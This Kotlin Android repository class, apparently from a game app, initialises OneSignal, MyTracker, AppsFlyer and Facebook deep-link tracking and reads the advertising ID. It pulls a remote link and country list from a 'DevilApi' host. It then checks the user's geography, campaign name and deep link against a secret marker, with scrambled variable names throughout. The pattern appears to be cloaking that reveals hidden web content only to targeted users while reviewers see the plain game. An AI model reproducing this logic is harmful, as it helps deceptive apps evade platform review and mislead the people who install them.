package com.superplusgames.hosandro.data

import android.app.Application
import android.content.Context
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.my.tracker.MyTracker
import com.onesignal.OneSignal
import com.superplusgames.hosandro.apiii.CountryCodeJS
import com.superplusgames.hosandro.apiii.DevilApi
import com.superplusgames.hosandro.apiii.DevilDataEntity
import com.superplusgames.hosandro.apiii.GeoUserApi
import com.superplusgames.hosandro.data.Constances.APPS_KEY
import com.superplusgames.hosandro.data.Constances.MAIN_CHECKER
import com.superplusgames.hosandro.data.Constances.MY_TRACKER_KEY
import com.superplusgames.hosandro.data.Constances.ONE_SIIIIIGN
import com.superplusgames.hosandro.data.Constances.key_instId
import com.superplusgames.hosandro.data.Constances.keyCodeFromHost
import com.superplusgames.hosandro.data.Constances.keyDEEPLINK
import com.superplusgames.hosandro.data.Constances.keyLinkaa
import com.superplusgames.hosandro.data.Constances.keyMAIN_ID
import com.superplusgames.hosandro.data.Constances.keyMainForSharedPref
import com.superplusgames.hosandro.data.Constances.keyNaming
import com.superplusgames.hosandro.data.Constances.key_myID
import com.superplusgames.hosandro.data.Constances.key_my_first_time
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Response
import java.util.*
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class MainRepoImpl @Inject constructor(
    private val application: Application,
    private val devilApi: DevilApi,
    private val geoUserApi: GeoUserApi,
) : MainRepository {

    init {
        Log.d("lolo", "MainRepoImpl created ${this}")
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(application)
        OneSignal.setAppId(ONE_SIIIIIGN)

        CoroutineScope(Dispatchers.Default).launch {
            getAdvertId()
        }
    }

    private fun getAdvertId() {
        val advertisingIdClient = AdvertisingIdClient(application)
        advertisingIdClient.start()
        advertisingIdClient.info.id.also {
            DataHolder.advertId = it
        }
    }

    private val sharedPreferences by lazy {
        application.getSharedPreferences(keyMainForSharedPref, AppCompatActivity.MODE_PRIVATE)
    }

    override fun loadSavedData() {
        DataHolder.codeFromDevilHost = readFromSharedPref(keyCodeFromHost, null)
        DataHolder.naming = readFromSharedPref(keyNaming, null)
        DataHolder.deepLink = readFromSharedPref(keyDEEPLINK, null)
        DataHolder.linka = readFromSharedPref(keyLinkaa, null)
        DataHolder.advertId = readFromSharedPref(keyMAIN_ID, null)
        DataHolder.instId = readFromSharedPref(key_instId, null)

        DataHolder.sharedPrefAlreadyLaoded = "yes"
    }

    override fun saveDataToSharedPref() {
        saveToSharedPref(keyCodeFromHost, DataHolder.codeFromDevilHost)
        saveToSharedPref(keyNaming, DataHolder.naming)
        saveToSharedPref(keyDEEPLINK, DataHolder.deepLink)
        saveToSharedPref(keyLinkaa, DataHolder.linka)
        saveToSharedPref(keyMAIN_ID, DataHolder.advertId)
        saveToSharedPref(key_instId, DataHolder.instId)
    }

    override suspend fun loadDataFromDevilApi(): Response<DevilDataEntity> {
        val result = devilApi.getDataDev()
        DataHolder.linka = result.body()!!.view
        DataHolder.listOfGeo = result.body()!!.geo
        DataHolder.codeFromDevilHost = result.body()!!.appsChecker
        Log.d("lolo", "loadDataFromDevilApi ${result.body()}")
        return result
    }

    override suspend fun loadDataFromGeoApi(): Response<CountryCodeJS> {
        val resuult = geoUserApi.getUserGeoCode()
        DataHolder.userCurrentGeo = resuult.body()!!.cou
        Log.d("lolo", "loadDataFromGeoApi ${resuult.body()}")
        return resuult
    }

    override fun initLoadFacebook() {
        getDeep(application)
    }


    override fun initLoadMyTracker() {
        val trackerParamsfrrr = MyTracker.getTrackerParams()

        val hyyhhyhyyhhy = MyTracker.getTrackerConfig()
        val hyjuujujikkiikikik = MyTracker.getInstanceId(application)
        hyyhhyhyyhhy.isTrackingLaunchEnabled = true
        if (sharedPreferences.getBoolean(key_my_first_time, true)) {
            val bgbnhnhhnhyhyhyhy = UUID.randomUUID().toString()
            trackerParamsfrrr.setCustomUserId(bgbnhnhhnhyhyhyhy)
            DataHolder.instId = hyjuujujikkiikikik
            sharedPreferences.edit().putBoolean(key_my_first_time, false).apply()

        } else {
            val fgrrrrr = readFromSharedPref(key_myID, "null")
            trackerParamsfrrr.setCustomUserId(fgrrrrr)
        }

        MyTracker.initTracker(MY_TRACKER_KEY, application)
    }

    override fun makeGeoCheck(): Boolean {
        if (DataHolder.listOfGeo!!.contains(DataHolder.userCurrentGeo!!)) {
            return true
        }
        return false
    }

    override fun makeNaimingCheck(): Boolean {
        if (DataHolder.naming!!.contains(MAIN_CHECKER)) return true
        return false
    }

    override fun makeDepplinCheck(): Boolean {
        if (DataHolder.deepLink!!.contains(MAIN_CHECKER)) return true
        return false
    }


    private fun readFromSharedPref(key: String, defValue: String?): String {
        return sharedPreferences.getString(key, defValue) ?: "null"
    }

    private fun saveToSharedPref(key: String, valuue: String?) {
        sharedPreferences.edit().apply {
            putString(key, valuue)
        }.apply()
    }

    private val conversionDataListener = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            Log.d("lolo", "onConversionDataSuccess before loading")
            data?.get("campaign").toString().apply {
                DataHolder.naming = this
                DataHolder.tempNaminglLoad = this
                Log.d("lolo", "onConversionDataSuccess")
                Log.d("lolo", "onConversionDataSuccess naming is ${this}")
            }
        }

        override fun onConversionDataFail(p0: String?) {
            Log.d("lolo", "onConversionDataFail")
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {
            Log.d("lolo", "onAppOpenAttribution")
        }

        override fun onAttributionFailure(p0: String?) {
            Log.d("lolo", "onAttributionFailure")
        }
    }

    private fun initAppsFlyerLibeer(context: Context) {
        AppsFlyerLib.getInstance()
            .init(APPS_KEY, conversionDataListener, application)
        Log.d("lolo", "initAppsFlyerLibeer")
        AppsFlyerLib.getInstance().start(application)
    }

    private fun getDeep(context: Context) {
        Log.d("lolo", "getDeep")
        AppLinkData.fetchDeferredAppLinkData(
            context
        ) { appLinkData: AppLinkData? ->
            appLinkData?.let {
                appLinkData.targetUri?.host.toString().apply {
                    DataHolder.deepLink = this
                    DataHolder.tempDeepLoad = this
                }
                Log.d("lolo", "getDeep loaded")
            }
            if (appLinkData == null) {
                Log.d("lolo", "appLinkData == null")
                DataHolder.tempDeepLoad = "null"
                if (DataHolder.deepLink == "null") {
                    DataHolder.deepLink = "null"
                }
            }
        }
    }
}